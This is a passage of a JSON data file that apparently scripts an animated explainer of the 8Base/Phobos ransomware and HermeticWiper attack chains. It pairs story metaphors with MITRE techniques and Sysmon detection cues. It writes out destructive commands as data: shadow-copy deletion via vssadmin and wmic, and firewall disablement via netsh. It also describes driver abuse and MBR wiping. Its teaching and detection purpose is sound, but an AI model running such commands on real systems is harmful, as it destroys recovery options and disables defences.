          "id": "VIEW_B",
          "label": "Page-1 Stamp",
          "position": [
            5.6,
            4.2,
            8.4
          ],
          "target": [
            4.1,
            1.9,
            -0.3
          ]
        },
        {
          "id": "VIEW_C",
          "label": "Audit Beam",
          "position": [
            0.3,
            6.6,
            9.2
          ],
          "target": [
            0,
            2.2,
            0
          ]
        }
      ],
      "mitreId": "T1070.001"
    }
  },
  "eightbase-phobos-smoke-loader-process-hacker": {
    "briefing": {
      "scenarioId": "eightbase-phobos-smoke-loader-process-hacker",
      "sectionKey": "briefing",
      "sceneKind": "ran-eightbase-briefing",
      "stageBadge": "BRIEFING #0 · END-TO-END STORY DIORAMA",
      "mitreId": "T1055",
      "title": "8Base / Phobos Ransomware: SmokeLoader Delivery, Process Hacker… — Story-to-Technical Overview",
      "storyCue": "Imagine a street-level burglary crew that slips into an office through an open desk door or booby-trapped attachment, opens a hidden relay pipe and borrows a signed technician wrench to disable security guards, then climbs past the desk confirmation prompt to tear down the firewall, snap the emergency-recovery levers off the wall, and clamp heavy locks onto every cabinet while popping open a full-screen ransom placard on every desk.",
      "technicalCue": "INITIAL ACCESS: SmokeLoader / SystemBC SOCKS5 Proxy & Process Hacker (`kprocesshacker.sys`) Staging -> DEFENSE EVASION: UAC Bypass, Windows Firewall Disablement (`netsh`) & Shadow Copy / Boot Recovery Wipe -> EXFIL & IMPACT: Phobos AES-256-CBC Encryption, `.8base` Extension Rename & `info.hta` HTML Application Note",
      "storyMappings": [
        {
          "storyTerm": "Hidden relay pipe and signed technician wrench disabling guards",
          "technicalTerm": "SmokeLoader, SystemBC SOCKS5 proxy, and Process Hacker (kprocesshacker.sys) BYOVD",
          "tone": "amber"
        },
        {
          "storyTerm": "Climbing past confirmation prompts to tear down fences and recovery levers",
          "technicalTerm": "UAC bypass, netsh firewall disablement, and vssadmin / bcdedit recovery wipe",
          "tone": "sky"
        },
        {
          "storyTerm": "Clamping heavy locks onto small files whole and huge files in chunks",
          "technicalTerm": "Phobos AES-256-CBC encryption renaming files with the .8base extension",
          "tone": "rose"
        },
        {
          "storyTerm": "Popping open a full-screen ransom placard on every desk",
          "technicalTerm": "info.hta HTML Application ransom notice launched via mshta.exe",
          "tone": "emerald"
        }
      ],
      "accentHex": "#F43F5E",
      "secondaryHex": "#FACC15",
      "durationSec": 18,
      "callouts": [
        {
          "id": "ran-eightbase-b-left",
          "tag": "ENTRY & STORY WORLD",
          "title": "Hidden relay pipe and signed technician…",
          "subtitle": "SmokeLoader, SystemBC SOCKS5 proxy, and Process Hacker…",
          "tone": "amber"
        },
        {
          "id": "ran-eightbase-b-right",
          "tag": "TARGET MECHANISM",
          "title": "Climbing past confirmation prompts to…",
          "subtitle": "UAC bypass, netsh firewall disablement, and vssadmin / bcdedit…",
          "tone": "sky"
        }
      ],
      "phases": [
        {
          "id": 1,
          "shortLabel": "1. Pipe",
          "stageTag": "STAGE 01 · INITIAL ACCESS",
          "title": "SmokeLoader / SystemBC SOCKS5 Proxy & Process Hacker (`kprocesshacker.sys`) Staging",
          "storyExcerpt": "Slipping onto a victim workstation through an exposed remote-desktop doorway or poisoned email attachment, a compact delivery agent sets up a quiet relay pipe and deploys a signed system-diagnostics…",
          "technicalParallel": "Under the hood, the observed step executes explorer.exe (Injected SmokeLoader payload downloads SystemBC SOCKS5 proxy & Phobos/8Base loader) (which invokes or targets the host daemon/process…",
          "accentHex": "#F43F5E",
          "startSec": 0,
          "endSec": 6
        },
        {
          "id": 2,
          "shortLabel": "2. Past Tear",
          "stageTag": "STAGE 02 · DEFENSE EVASION",
          "title": "UAC Bypass, Windows Firewall Disablement (`netsh`) & Shadow Copy / Boot Recovery Wipe",
          "storyExcerpt": "Planting copies of itself inside both the morning startup folder and the master launch registry so it survives reboots, the payload hops past user permission prompts, shuts off the building firewall…",
          "technicalParallel": "Under the hood, the observed step executes vssadmin.exe delete shadows /all /quiet && wmic.exe shadowcopy delete (which executes vssadmin.exe delete shadows /all /quiet , or WMI Win32_ShadowCopy.Delete…",
          "accentHex": "#22D3EE",
          "startSec": 6,
          "endSec": 12
        },
        {
          "id": 3,
          "shortLabel": "3. Onto Huge",
          "stageTag": "STAGE 03 · EXFIL & IMPACT",
          "title": "Phobos AES-256-CBC Encryption, `.8base` Extension Rename & `info.hta` HTML Application Note",
          "storyExcerpt": "Sweeping across every non-system drawer on the machine, the Phobos locking engine seals small documents completely and seals giant files rapidly in slices, stamps every locked item with an 8base tag, and…",
          "technicalParallel": "Under the hood, the observed step executes phobos_8base.exe -> Encrypts files with AES-256-CBC + RSA-1024 -> *.id[A1B2C3D4].[support@8base.vc].8base (which executes the technical command / telemetry…",
          "accentHex": "#FACC15",
          "startSec": 12,
          "endSec": 18
        }
      ],
      "cameraPresets": [
        {
          "id": "DIRECTOR",
          "label": "Director",
          "position": [
            0.2,
            5.6,
            15.8
          ],
          "target": [
            0,
            1.9,
            0
          ]
        },
        {
          "id": "VIEW_A",
          "label": "Relay Pipe",
          "position": [
            -5.6,
            4.2,
            8.4
          ],
          "target": [
            -4.1,
            1.9,
            -0.3
          ]
        },
        {
          "id": "VIEW_B",
          "label": "Locked Vault",
          "position": [
            5.6,
            4.2,
            8.4
          ],
          "target": [
            4.1,
            1.9,
            -0.3
          ]
        },
        {
          "id": "VIEW_C",
          "label": "Bypass Lock",
          "position": [
            0.3,
            6.6,
            9.2
          ],
          "target": [
            0,
            2.2,
            0
          ]
        }
      ]
    },
    "step-1": {
      "scenarioId": "eightbase-phobos-smoke-loader-process-hacker",
      "sectionKey": "step-1",
      "sceneKind": "ran-eightbase-step-1",
      "stageBadge": "STEP #1 · INITIAL ACCESS",
      "title": "SmokeLoader / SystemBC SOCKS5 Proxy & Process Hacker (kprocesshacker.sys) Staging",
      "storyCue": "Slipping onto a victim workstation through an exposed remote-desktop doorway or poisoned email attachment, a compact delivery agent sets up a quiet relay pipe and deploys a signed system-diagnostics driver to knock out active endpoint guards.",
      "technicalCue": "T1055 · INITIAL ACCESS — 8Base affiliates gain initial access via exposed RDP or phishing attachments delivering SmokeLoader (which injects into explorer.exe), establish a persistent SystemBC Tor/SOCKS5 backdoor, and…",
      "storyMappings": [
        {
          "storyTerm": "Compact delivery agent from a poisoned doorway",
          "technicalTerm": "SmokeLoader delivered via exposed RDP or phishing attachments",
          "tone": "amber"
        },
        {
          "storyTerm": "Quiet relay pipe bridging back to operators",
          "technicalTerm": "SystemBC SOCKS5 proxy maintaining persistent C2 tunneling",
          "tone": "sky"
        },
        {
          "storyTerm": "Signed system-diagnostics wrench knocking out guards",
          "technicalTerm": "Abused Process Hacker kernel driver (kprocesshacker.sys) terminating security agents",
          "tone": "rose"
        },
        {
          "storyTerm": "Clearing the host before lockdown",
          "technicalTerm": "Initial foothold and defense evasion preparing for Phobos/8Base detonation",
          "tone": "emerald"
        }
      ],
      "accentHex": "#F43F5E",
      "secondaryHex": "#F43F5E",
      "durationSec": 15,
      "callouts": [
        {
          "id": "ran-eightbase-step-1-left",
          "tag": "STEP 1 · FOCUS",
          "title": "Compact delivery agent from a poisoned…",
          "subtitle": "SmokeLoader delivered via exposed RDP or phishing attachments",
          "tone": "amber"
        },
        {
          "id": "ran-eightbase-step-1-right",
          "tag": "STEP 1 · ACTION",
          "title": "Quiet relay pipe bridging back to…",
          "subtitle": "SystemBC SOCKS5 proxy maintaining persistent C2 tunneling",
          "tone": "sky"
        }
      ],
      "phases": [
        {
          "id": 1,
          "shortLabel": "1. Onto Sets",
          "stageTag": "STEP 01 · SETUP",
          "title": "Compact delivery agent from a poisoned doorway",
          "storyExcerpt": "Slipping onto a victim workstation through an exposed remote-desktop doorway or poisoned email attachment, a compact delivery agent sets up a quiet relay pipe and deploys a signed…",
          "technicalParallel": "Under the hood, the observed step executes explorer.exe (Injected SmokeLoader payload downloads SystemBC SOCKS5 proxy & Phobos/8Base loader) (which invokes or targets the host daemon/process…",
          "accentHex": "#F43F5E",
          "startSec": 0,
          "endSec": 5
        },
        {
          "id": 2,
          "shortLabel": "2. Pipe Back",
          "stageTag": "STEP 01 · MECHANISM",
          "title": "Quiet relay pipe bridging back to operators",
          "storyExcerpt": "Inside the facility, the hidden mechanism uses quiet relay pipe bridging back to operators to advance toward signed system-diagnostics wrench knocking out guards.",
          "technicalParallel": "8Base affiliates gain initial access via exposed RDP or phishing attachments delivering SmokeLoader (which injects into explorer.exe), establish a persistent SystemBC Tor/SOCKS5 backdoor, and deploy…",
          "accentHex": "#F59E0B",
          "startSec": 5,
          "endSec": 10.2
        },
        {
          "id": 3,
          "shortLabel": "3. Host",
          "stageTag": "STEP 01 · EVIDENCE",
          "title": "Clearing the host before lockdown",
          "storyExcerpt": "Behind the scenes, clearing the host before lockdown captures the unmistakable footprint of the intrusion.",
          "technicalParallel": "Documented in Sysmon Event 6 (recording InitialLoader=SmokeLoader + SystemBC SOCKS5 Backdoor, KernelDriverAbused=kprocesshacker.sys , Process Hacker 2 Driver, AdvisoryId=CISA AA24-045A , #StopRansomware…",
          "accentHex": "#10B981",
          "startSec": 10.2,
          "endSec": 15
        }
      ],
      "cameraPresets": [
        {
          "id": "DIRECTOR",
          "label": "Director",
          "position": [
            0.2,
            5.6,
            15.8
          ],
          "target": [
            0,
            1.9,
            0
          ]
        },
        {
          "id": "VIEW_A",
          "label": "Relay Pipe",
          "position": [
            -4.3,
            4.2,
            8.4
          ],
          "target": [
            -2.8,
            1.9,
            -0.3
          ]
        },
        {
          "id": "VIEW_B",
          "label": "Locked Vault",
          "position": [
            6.3,
            4.2,
            8.4
          ],
          "target": [
            4.8,
            1.9,
            -0.3
          ]
        },
        {
          "id": "VIEW_C",
          "label": "Bypass Lock",
          "position": [
            0.3,
            6.6,
            9.2
          ],
          "target": [
            0,
            2.2,
            0
          ]
        }
      ],
      "mitreId": "T1055"
    },
    "step-2": {
      "scenarioId": "eightbase-phobos-smoke-loader-process-hacker",
      "sectionKey": "step-2",
      "sceneKind": "ran-eightbase-step-2",
      "stageBadge": "STEP #2 · DEFENSE EVASION",
      "title": "UAC Bypass, Windows Firewall Disablement (netsh) & Shadow Copy / Boot Recovery Wipe",
      "storyCue": "Planting copies of itself inside both the morning startup folder and the master launch registry so it survives reboots, the payload hops past user permission prompts, shuts off the building firewall walls, and cuts off both shadow backups and emergency boot-repair switches.",
      "technicalCue": "T1562.004 · DEFENSE EVASION — The Phobos/8Base payload copies itself to %APPDATA%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup and HKLM\\...\\Run for persistence, disables the Windows Firewall via netsh advfirewall set…",
      "storyMappings": [
        {
          "storyTerm": "Planting copies in the startup folder and launch registry",
          "technicalTerm": "Persistence in %APPDATA%\\...\\Startup and HKLM Run keys",
          "tone": "amber"
        },
        {
          "storyTerm": "Hopping past user permission prompts",
          "technicalTerm": "User Account Control (UAC) bypass elevating to high integrity",
          "tone": "sky"
        },
        {
          "storyTerm": "Shutting off the building firewall walls",
          "technicalTerm": "netsh advfirewall set allprofiles state off disabling host firewall rules",
          "tone": "rose"
        },
        {
          "storyTerm": "Cutting off backups and boot-repair switches",
          "technicalTerm": "Deleting Volume Shadow Copies and disabling Windows recovery via bcdedit",
          "tone": "emerald"
        }
      ],
      "accentHex": "#F59E0B",
      "secondaryHex": "#F43F5E",
      "durationSec": 15,
      "callouts": [
        {
          "id": "ran-eightbase-step-2-left",
          "tag": "STEP 2 · FOCUS",
          "title": "Planting copies in the startup folder…",
          "subtitle": "Persistence in %APPDATA%\\...\\Startup and HKLM Run keys",
          "tone": "amber"
        },
        {
          "id": "ran-eightbase-step-2-right",
          "tag": "STEP 2 · ACTION",
          "title": "Hopping past user permission prompts",
          "subtitle": "User Account Control (UAC) bypass elevating to high integrity",
          "tone": "sky"
        }
      ],
      "phases": [
        {
          "id": 1,
          "shortLabel": "1. Both So",
          "stageTag": "STEP 02 · SETUP",
          "title": "Planting copies in the startup folder and launch…",
          "storyExcerpt": "Planting copies of itself inside both the morning startup folder and the master launch registry so it survives reboots, the payload hops past user permission prompts, shuts off the building…",
          "technicalParallel": "Under the hood, the observed step executes vssadmin.exe delete shadows /all /quiet && wmic.exe shadowcopy delete (which executes vssadmin.exe delete shadows /all /quiet , or WMI Win32_ShadowCopy.Delete…",
          "accentHex": "#F43F5E",
          "startSec": 0,
          "endSec": 5
        },
        {
          "id": 2,
          "shortLabel": "2. Past User",
          "stageTag": "STEP 02 · MECHANISM",
          "title": "Hopping past user permission prompts",
          "storyExcerpt": "Inside the facility, the hidden mechanism uses hopping past user permission prompts to advance toward shutting off the building firewall walls.",
          "technicalParallel": "The Phobos/8Base payload copies itself to %APPDATA%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup and HKLM\\...\\Run for persistence, disables the Windows Firewall via netsh advfirewall set allprofiles…",
          "accentHex": "#F59E0B",
          "startSec": 5,
          "endSec": 10.2
        },
        {
          "id": 3,
          "shortLabel": "3. Off Boot-repair",
          "stageTag": "STEP 02 · EVIDENCE",
          "title": "Cutting off backups and boot-repair switches",
          "storyExcerpt": "Behind the scenes, cutting off backups and boot-repair switches captures the unmistakable footprint of the intrusion.",
          "technicalParallel": "Documented in Sysmon Event 1 (recording FirewallModification=netsh advfirewall set allprofiles state off, RecoveryInhibition=vssadmin + wmic shadowcopy + wbadmin + bcdedit, StartupPersistence=Startup…",
          "accentHex": "#10B981",
          "startSec": 10.2,
          "endSec": 15
        }
      ],
      "cameraPresets": [
        {
          "id": "DIRECTOR",
          "label": "Director",
          "position": [
            0.2,
            5.6,
            15.8
          ],
          "target": [
            0,
            1.9,
            0
          ]
        },
        {
          "id": "VIEW_A",
          "label": "Relay Pipe",
          "position": [
            -5.6,
            4.2,
            8.4
          ],
          "target": [
            -4.1,
            1.9,
            -0.3
          ]
        },
        {
          "id": "VIEW_B",
          "label": "Locked Vault",
          "position": [
            5.6,
            4.2,
            8.4
          ],
          "target": [
            4.1,
            1.9,
            -0.3
          ]
        },
        {
          "id": "VIEW_C",
          "label": "Bypass Lock",
          "position": [
            0.3,
            6.6,
            9.2
          ],
          "target": [
            0,
            2.2,
            0
          ]
        }
      ],
      "mitreId": "T1562.004"
    },
    "step-3": {
      "scenarioId": "eightbase-phobos-smoke-loader-process-hacker",
      "sectionKey": "step-3",
      "sceneKind": "ran-eightbase-step-3",
      "stageBadge": "STEP #3 · EXFIL & IMPACT",
      "title": "Phobos AES-256-CBC Encryption.8base Extension Rename & info.hta HTML Application Note",
      "storyCue": "Sweeping across every non-system drawer on the machine, the Phobos locking engine seals small documents completely and seals giant files rapidly in slices, stamps every locked item with an 8base tag, and pops open an interactive ransom placard right on the desktop.",
      "technicalCue": "T1486 · EXFIL & IMPACT — 8Base encrypts all non-system files using AES-256-CBC (encrypting files under 1.5 MB completely and larger files partially before protecting the per-victim AES key with an embedded RSA-1024…",
      "storyMappings": [
        {
          "storyTerm": "Sealing small documents whole and giant files in slices",
          "technicalTerm": "Phobos AES-256-CBC full encryption under 1.5 MB and partial encryption on larger files",
          "tone": "amber"
        },
        {
          "storyTerm": "Stamping every locked item with a branded tag",
          "technicalTerm": "Encrypted files renamed with the .8base suffix and victim identifier",
          "tone": "sky"
        },
        {
          "storyTerm": "Interactive ransom placard popped onto the desktop",
          "technicalTerm": "info.hta HTML Application rendered automatically on infected hosts",
          "tone": "rose"
        },
        {
          "storyTerm": "Shared Phobos criminal family lineage",
          "technicalTerm": "8Base affiliate configuration running atop the established Phobos encryptor",
          "tone": "emerald"
        }
      ],
      "accentHex": "#FACC15",
      "secondaryHex": "#10B981",
      "durationSec": 15,
      "callouts": [
        {
          "id": "ran-eightbase-step-3-left",
          "tag": "STEP 3 · FOCUS",
          "title": "Sealing small documents whole and giant…",
          "subtitle": "Phobos AES-256-CBC full encryption under 1.5 MB and partial…",
          "tone": "amber"
        },
        {
          "id": "ran-eightbase-step-3-right",
          "tag": "STEP 3 · ACTION",
          "title": "Stamping every locked item with a…",
          "subtitle": "Encrypted files renamed with the .8base suffix and victim…",
          "tone": "sky"
        }
      ],
      "phases": [
        {
          "id": 1,
          "shortLabel": "1. Non-system Item",
          "stageTag": "STEP 03 · SETUP",
          "title": "Sealing small documents whole and giant files in…",
          "storyExcerpt": "Sweeping across every non-system drawer on the machine, the Phobos locking engine seals small documents completely and seals giant files rapidly in slices, stamps every locked item with an…",
          "technicalParallel": "Under the hood, the observed step executes phobos_8base.exe -> Encrypts files with AES-256-CBC + RSA-1024 -> *.id[A1B2C3D4].[support@8base.vc].8base (which executes the technical command / telemetry…",
          "accentHex": "#F43F5E",
          "startSec": 0,
          "endSec": 5
        },
        {
          "id": 2,
          "shortLabel": "2. Item Tag",
          "stageTag": "STEP 03 · MECHANISM",
          "title": "Stamping every locked item with a branded tag",
          "storyExcerpt": "Inside the facility, the hidden mechanism uses stamping every locked item with a branded tag to advance toward interactive ransom placard popped onto the desktop.",
          "technicalParallel": "8Base encrypts all non-system files using AES-256-CBC (encrypting files under 1.5 MB completely and larger files partially before protecting the per-victim AES key with an embedded RSA-1024 public key)…",
          "accentHex": "#F59E0B",
          "startSec": 5,
          "endSec": 10.2
        },
        {
          "id": 3,
          "shortLabel": "3. Onto",
          "stageTag": "STEP 03 · EVIDENCE",
          "title": "Shared Phobos criminal family lineage",
          "storyExcerpt": "Behind the scenes, shared phobos criminal family lineage captures the unmistakable footprint of the intrusion.",
          "technicalParallel": "Documented in Sysmon Event 11 (recording RansomwareFamily=8Base , Phobos Ransomware-as-a-Service Variant, FilePattern=*.id[<victim_id>].[support@8base.vc].8base, HtmlRansomNote=info.hta launched via…",
          "accentHex": "#10B981",
          "startSec": 10.2,
          "endSec": 15
        }
      ],
      "cameraPresets": [
        {
          "id": "DIRECTOR",
          "label": "Director",
          "position": [
            0.2,
            5.6,
            15.8
          ],
          "target": [
            0,
            1.9,
            0
          ]
        },
        {
          "id": "VIEW_A",
          "label": "Relay Pipe",
          "position": [
            -6.3,
            4.2,
            8.4
          ],
          "target": [
            -4.8,
            1.9,
            -0.3
          ]
        },
        {
          "id": "VIEW_B",
          "label": "Locked Vault",
          "position": [
            4.3,
            4.2,
            8.4
          ],
          "target": [
            2.8,
            1.9,
            -0.3
          ]
        },
        {
          "id": "VIEW_C",
          "label": "Bypass Lock",
          "position": [
            0.3,
            6.6,
            9.2
          ],
          "target": [
            0,
            2.2,
            0
          ]
        }
      ],
      "mitreId": "T1486"
    }
  },
  "hermeticwiper-ukraine-easeus-mbr-wipe": {
    "briefing": {
      "scenarioId": "hermeticwiper-ukraine-easeus-mbr-wipe",
      "sectionKey": "briefing",
      "sceneKind": "ran-hermeticwiper-briefing",
      "stageBadge": "BRIEFING #0 · END-TO-END STORY DIORAMA",
      "mitreId": "T1068",
      "title": "Sandworm HermeticWiper Signed EaseUS Driver (empntdrv.sys) MBR & NTFS… — Story-to-Technical Overview",
      "storyCue": "Imagine a wartime saboteur who is not after ransom money at all, but wants every computer in an organization turned into a permanent brick before sunrise. First, the saboteur unpacks an authentic, validly signed disk-partitioning guard badge from its own coat pocket to gain direct physical access to the raw floor tiles; next, it disables every backup and crash log while shattering the building index directory; finally, it smashes the front entrance map of every hard drive with pure random static so no floor can ever start up again.",
      "technicalCue": "DEFENSE EVASION: Extracting & Registering Signed EaseUS Driver (empntdrv.sys) from RCDATA -> DEFENSE EVASION: Disabling Volume Shadow Copy (vss), Crash Dumps & Fragmenting NTFS Metadata -> EXFIL & IMPACT: Raw \\\\.\\PhysicalDrive0..100 MBR & NTFS $MFT Overwrite with CSPRNG Bytes",
      "storyMappings": [
        {
          "storyTerm": "Unpacking a validly signed disk-partitioning badge from its pocket",
          "technicalTerm": "Extracting signed EaseUS empntdrv.sys driver from PE RCDATA resource (BYOVD)",
          "tone": "amber"
        },
        {
          "storyTerm": "Disabling backups and shattering the building index directory",
          "technicalTerm": "Stopping Volume Shadow Copy (vss) and fragmenting NTFS $MFT and metadata files",
          "tone": "sky"
        },
        {
          "storyTerm": "Smashing every drive entrance map with pure random static",
          "technicalTerm": "Overwriting \\\\.\\PhysicalDrive0..100 MBR and NTFS $MFT with CSPRNG bytes",
          "tone": "rose"
        },
        {
          "storyTerm": "Turning every machine into a permanent brick before sunrise",
          "technicalTerm": "Destructive Sandworm wiper attack forcing unbootable system reboot",
          "tone": "emerald"
        }
      ],
      "accentHex": "#F43F5E",
      "secondaryHex": "#F59E0B",
      "durationSec": 18,
      "callouts": [
        {
          "id": "ran-hermeticwiper-b-left",
          "tag": "ENTRY & STORY WORLD",
          "title": "Unpacking a validly signed…",
          "subtitle": "Extracting signed EaseUS empntdrv.sys driver from PE RCDATA…",
          "tone": "amber"
        },
        {
          "id": "ran-hermeticwiper-b-right",
          "tag": "TARGET MECHANISM",
          "title": "Disabling backups and shattering the…",
          "subtitle": "Stopping Volume Shadow Copy (vss) and fragmenting NTFS $MFT…",
          "tone": "sky"
        }
      ],
      "phases": [
        {
          "id": 1,
          "shortLabel": "1. Disk-utility Out",
          "stageTag": "STAGE 01 · DEFENSE EVASION",
          "title": "Extracting & Registering Signed EaseUS Driver (empntdrv.sys) from RCDATA",
          "storyExcerpt": "Pushed simultaneously across hundreds of offices by the central policy board, the saboteur unlocks special driver-loading clearance, pulls an authentic signed disk-utility driver out of its own hidden…",
          "technicalParallel": "Both the outer HermeticWiper executable (signed by Hermetica Digital Ltd until revoked) and the inner empntdrv.sys kernel driver (signed by CHENGDU YIWO Tech Development Co., Ltd.) carried valid…",
          "accentHex": "#F43F5E",
          "startSec": 0,
          "endSec": 6
        },
        {
          "id": 2,
          "shortLabel": "2. Then So",
          "stageTag": "STAGE 02 · DEFENSE EVASION",
          "title": "Disabling Volume Shadow Copy (vss), Crash Dumps & Fragmenting NTFS Metadata",
          "storyExcerpt": "Before swinging the sledgehammer, the saboteur pulls the power plugs on the building automatic backup vault and crash-diary recorder, then deliberately shatters the floor index catalog into thousands of…",
          "technicalParallel": "By parsing the NTFS $MFT runlist fragments directly rather than using standard Windows file APIs, HermeticWiper could corrupt the exact physical sectors backing critical OS metadata even while Windows…",
          "accentHex": "#22D3EE",
          "startSec": 6,
          "endSec": 12
        },
        {
          "id": 3,
          "shortLabel": "3. Bay Zero",
          "stageTag": "STAGE 03 · EXFIL & IMPACT",
          "title": "Raw \\\\.\\PhysicalDrive0..100 MBR & NTFS $MFT Overwrite with CSPRNG Bytes",
          "storyExcerpt": "Walking methodically from storage bay zero up to bay one hundred, the saboteur uses its raw disk pass to blast every drive opening directory and master file catalog with irreversible random noise, then…",
          "technicalParallel": "Because the $MFT (which maps where every file resides on an NTFS volume) and $MFTMirr are overwritten with random bytes from CryptGenRandom, carving or recovering filesystem structure is rendered…",
          "accentHex": "#F59E0B",
          "startSec": 12,
          "endSec": 18
        }
      ],
      "cameraPresets": [
        {
          "id": "DIRECTOR",
          "label": "Director",
          "position": [
            0.2,
            5.6,
            15.8
          ],
          "target": [
            0,
            1.9,
            0
          ]
        },
        {
          "id": "VIEW_A",
          "label": "Driver Gate",
          "position": [
            -5.6,
            4.2,
            8.4
          ],
          "target": [
            -4.1,
            1.9,
            -0.3
          ]
        },
        {
          "id": "VIEW_B",
          "label": "Boot Furnace",
          "position": [
            5.6,
            4.2,
            8.4
          ],
          "target": [
            4.1,
            1.9,
            -0.3
          ]
        },
        {
          "id": "VIEW_C",
          "label": "Wipe Stream",
          "position": [
            0.3,
            6.6,
            9.2
          ],
          "target": [
            0,
            2.2,
            0
          ]
        }
      ]
    },
    "step-1": {
      "scenarioId": "hermeticwiper-ukraine-easeus-mbr-wipe",
      "sectionKey": "step-1",
      "sceneKind": "ran-hermeticwiper-step-1",
      "stageBadge": "STEP #1 · DEFENSE EVASION",
      "title": "Extracting & Registering Signed EaseUS Driver (empntdrv.sys) from RCDATA",
      "storyCue": "Pushed simultaneously across hundreds of offices by the central policy board, the saboteur unlocks special driver-loading clearance, pulls an authentic signed disk-utility driver out of its own hidden pocket, and bolts it straight into the building core engine.",
      "technicalCue": "T1068 · DEFENSE EVASION — Upon execution via Active Directory GPO or WMI, HermeticWiper enabled SeLoadDriverPrivilege, SeBackupPrivilege, and SeShutdownPrivilege in its process token, checked the OS architecture and…",
      "storyMappings": [
        {
          "storyTerm": "Unlocking special driver-loading clearance",
          "technicalTerm": "Enabling SeLoadDriverPrivilege, SeBackupPrivilege, and SeShutdownPrivilege tokens",
          "tone": "amber"
        },
        {
          "storyTerm": "Pulling an authentic disk-utility driver from its hidden pocket",
          "technicalTerm": "Decompressing embedded signed EaseUS empntdrv.sys from PE RCDATA resource",
          "tone": "sky"
        },
        {
          "storyTerm": "Bolting it into the building core engine",
          "technicalTerm": "Registering C:\\Windows\\System32\\drivers\\??dr.sys signed by CHENGDU YIWO Tech",
          "tone": "rose"
        },
        {
          "storyTerm": "Bypassing modern storage locks",
          "technicalTerm": "Gaining unrestricted Ring-0 raw physical disk write capability via BYOVD",
          "tone": "emerald"
        }
      ],
      "accentHex": "#F43F5E",
      "secondaryHex": "#F43F5E",
      "durationSec": 15,
      "callouts": [
        {
          "id": "ran-hermeticwiper-step-1-left",
          "tag": "STEP 1 · FOCUS",
          "title": "Unlocking special driver-loading clearance",
          "subtitle": "Enabling SeLoadDriverPrivilege, SeBackupPrivilege, and…",
          "tone": "amber"
        },
        {
          "id": "ran-hermeticwiper-step-1-right",
          "tag": "STEP 1 · ACTION",
          "title": "Pulling an authentic disk-utility driver…",
          "subtitle": "Decompressing embedded signed EaseUS empntdrv.sys from PE…",
          "tone": "sky"
        }
      ],
      "phases": [
        {
          "id": 1,
          "shortLabel": "1. Disk-utility Out",
          "stageTag": "STEP 01 · SETUP",
          "title": "Unlocking special driver-loading clearance",
          "storyExcerpt": "Pushed simultaneously across hundreds of offices by the central policy board, the saboteur unlocks special driver-loading clearance, pulls an authentic signed disk-utility driver out of its own…",
          "technicalParallel": "Both the outer HermeticWiper executable (signed by Hermetica Digital Ltd until revoked) and the inner empntdrv.sys kernel driver (signed by CHENGDU YIWO Tech Development Co., Ltd.) carried valid…",
          "accentHex": "#F43F5E",
          "startSec": 0,
          "endSec": 5
        },
        {
          "id": 2,
          "shortLabel": "2. Disk-utility",
          "stageTag": "STEP 01 · MECHANISM",
          "title": "Pulling an authentic disk-utility driver from its…",
          "storyExcerpt": "Inside the facility, the hidden mechanism uses pulling an authentic disk-utility driver from its hidden pocket to advance toward bolting it into the building core engine.",
          "technicalParallel": "Upon execution via Active Directory GPO or WMI, HermeticWiper enabled SeLoadDriverPrivilege, SeBackupPrivilege, and SeShutdownPrivilege in its process token, checked the OS architecture and Windows…",
          "accentHex": "#F59E0B",
          "startSec": 5,
          "endSec": 10.2
        },
        {
          "id": 3,
          "shortLabel": "3. It Core",
          "stageTag": "STEP 01 · EVIDENCE",
          "title": "Bypassing modern storage locks",
          "storyExcerpt": "Behind the scenes, bypassing modern storage locks captures the unmistakable footprint of the intrusion.",
          "technicalParallel": "Alert on Sysmon EventID 6 (DriverLoaded tracking kernel driver signatures and file paths) for empntdrv.sys or randomized C:\\Windows\\System32\\drivers\\??dr.sys binaries signed by CHENGDU YIWO Tech…",
          "accentHex": "#10B981",
          "startSec": 10.2,
          "endSec": 15
        }
      ],
      "cameraPresets": [
        {
          "id": "DIRECTOR",
          "label": "Director",
          "position": [
            0.2,
            5.6,
            15.8
          ],
          "target": [
            0,
            1.9,
            0
          ]
        },
        {
          "id": "VIEW_A",
          "label": "Driver Gate",
          "position": [
            -4.3,
            4.2,
            8.4
          ],
          "target": [
            -2.8,
            1.9,
            -0.3
          ]
        },
        {
          "id": "VIEW_B",
          "label": "Boot Furnace",
          "position": [
            6.3,
            4.2,
            8.4
          ],
          "target": [
            4.8,
            1.9,
            -0.3
          ]
        },
        {
          "id": "VIEW_C",
          "label": "Wipe Stream",
          "position": [
            0.3,
            6.6,
            9.2
          ],
          "target": [
            0,
            2.2,
            0
          ]
        }
      ],
      "mitreId": "T1068"
    },
    "step-2": {
      "scenarioId": "hermeticwiper-ukraine-easeus-mbr-wipe",
      "sectionKey": "step-2",
      "sceneKind": "ran-hermeticwiper-step-2",
      "stageBadge": "STEP #2 · DEFENSE EVASION",
      "title": "Disabling Volume Shadow Copy (vss), Crash Dumps & Fragmenting NTFS Metadata",
      "storyCue": "Before swinging the sledgehammer, the saboteur pulls the power plugs on the building automatic backup vault and crash-diary recorder, then deliberately shatters the floor index catalog into thousands of broken fragments so recovery teams cannot piece files back together.",
      "technicalCue": "T1490 · DEFENSE EVASION — HermeticWiper called ChangeServiceConfigW and ControlService to disable and stop the vss (Volume Shadow Copy) service, set HKLM\\SYSTEM\\CurrentControlSet\\Control\\CrashControl\\CrashDumpEnabled =…",
      "storyMappings": [
        {
          "storyTerm": "Pulling power plugs on the backup vault and crash recorder",
          "technicalTerm": "ChangeServiceConfigW and ControlService disabling Volume Shadow Copy (vss) and crash dumps",
          "tone": "amber"
        },
        {
          "storyTerm": "Shattering the floor index catalog into fragments",
          "technicalTerm": "Fragmenting NTFS metadata structures ($Bitmap, $LogFile, $MFT) across disks",
          "tone": "sky"
        },
        {
          "storyTerm": "Preventing forensic recovery teams from rebuilding files",
          "technicalTerm": "Destroying filesystem allocation maps prior to raw sector wiping",
          "tone": "rose"
        },
        {
          "storyTerm": "Covering every internal storage room",
          "technicalTerm": "Targeting all attached local and mounted Windows NTFS volumes",
          "tone": "emerald"
        }
      ],
      "accentHex": "#F59E0B",
      "secondaryHex": "#F43F5E",
      "durationSec": 15,
      "callouts": [
        {
          "id": "ran-hermeticwiper-step-2-left",
          "tag": "STEP 2 · FOCUS",
          "title": "Pulling power plugs on the backup vault…",
          "subtitle": "ChangeServiceConfigW and ControlService disabling Volume…",
          "tone": "amber"
        },
        {
          "id": "ran-hermeticwiper-step-2-right",
          "tag": "STEP 2 · ACTION",
